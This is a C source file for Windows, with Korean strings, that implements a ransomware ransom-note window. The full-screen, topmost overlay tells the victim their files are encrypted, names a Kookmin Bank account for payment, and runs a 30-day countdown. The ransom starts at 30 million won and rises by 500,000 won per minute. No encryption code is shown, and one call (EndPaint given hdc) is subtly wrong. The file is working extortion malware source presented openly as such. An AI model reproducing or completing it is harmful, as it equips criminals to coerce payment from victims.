#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "ransomenote.h"

#define ID_TIMER 1
#define TIME_LIMIT_SECONDS (30 * 24 * 60 * 60)  // 30일 = 2,592,000초
#define BASE_AMOUNT 30000000                    // 3천만 원
#define INCREMENT_PER_MIN 500000                // 50만 원/분

static int remaining_seconds = TIME_LIMIT_SECONDS;
HFONT hMainFont;
HICON hWarnIcon;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        SetTimer(hwnd, ID_TIMER, 1000, NULL);

        hMainFont = CreateFontA(
            44, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Courier New");

        hWarnIcon = LoadIcon(NULL, IDI_ERROR);  // 기본 시스템 경고 아이콘
        break;

    case WM_TIMER:
        if (remaining_seconds > 0) remaining_seconds--;
        InvalidateRect(hwnd, NULL, TRUE);
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);

        FillRect(hdc, &rect, CreateSolidBrush(RGB(0, 0, 0)));  // 검정 배경
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 0, 0));
        SelectObject(hdc, hMainFont);

        int days = remaining_seconds / (60 * 60 * 24);
        int hours = (remaining_seconds % (60 * 60 * 24)) / 3600;
        int minutes = (remaining_seconds % 3600) / 60;
        int seconds = remaining_seconds % 60;

        int penalty_minutes = (TIME_LIMIT_SECONDS - remaining_seconds) / 60;
        int current_amount = BASE_AMOUNT + penalty_minutes * INCREMENT_PER_MIN;

        char message[1024];
        snprintf(message, sizeof(message),
            "!!! 당신의 파일은 암호화되었습니다 !!!\n\n"
            "복구를 원하시면 아래 계좌로 송금하세요.\n"
            "국민은행 71820101289762\n\n"
            "요구 금액: %d원\n"
            "남은 시간: %d일 %02d시간 %02d분 %02d초\n"
            "시간이 지날수록 비용이 증가합니다.",
            current_amount, days, hours, minutes, seconds);

        DrawTextA(hdc, message, -1, &rect, DT_CENTER | DT_VCENTER | DT_WORDBREAK);

        DrawIconEx(hdc, rect.right / 2 - 32, rect.top + 40, hWarnIcon, 64, 64, 0, NULL, DI_NORMAL);
        EndPaint(hdc, &ps);
        break;
    }

    case WM_CLOSE:
        KillTimer(hwnd, ID_TIMER);
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        DeleteObject(hMainFont);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void create_ransom_note(void) {
    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RansomNoteWindow";
    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));  // 검정 배경

    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(
        WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "RansomNoteWindow", "WARNING",
        WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, wc.hInstance, NULL);

    if (!hwnd) {
        MessageBoxA(NULL, "랜섬노트 창 생성 실패", "에러", MB_ICONERROR);
        return;
    }

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);  // 배경 투명 색상
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    SetForegroundWindow(hwnd);

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
        Sleep(10);
    }
}